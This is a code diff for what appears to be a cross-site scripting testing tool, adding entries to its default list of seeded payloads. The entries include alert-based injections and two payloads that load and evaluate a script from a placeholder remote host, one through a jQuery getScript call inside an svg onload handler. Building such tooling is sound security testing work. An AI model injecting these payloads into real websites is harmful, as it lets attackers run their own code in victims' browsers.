@@ -52,9 +52,12 @@ func initialize(database string) (err error) {
 		log.Println("Adding basic payloads")
 		payloads := []core.Payload{
 			{Description: "As simple as it can get!", Code: "<script>alert(1)</script>"},
-			{Description: "Simple attribute injection", Code: "\" onload=alert(1)"},
+			{Description: "URI basic payload", Code: "javascript:alert(1)"},
+			{Description: "Basic js code injection", Code: "; alert(1);"},
+			{Description: "Simple attribute injection", Code: "\" onload=alert(1) "},
 			{Description: "Attribute injection and tag escaping", Code: "\"><img src=x onerror=alert(1)>"},
 			{Description: "Include remote script", Code: fmt.Sprintf("<script src='%v'></script>", "[[HOST_REPLACE_ME]]")},
+			{Description: "Get script via jQuery and onload event", Code: fmt.Sprintf("\"><svg onload='$.getScript(\\'%v\\', function(d, x, y){eval(d);})'>", "[[HOST_REPLACE_ME]]")},
 		}
 
 		for _, payload := range payloads {
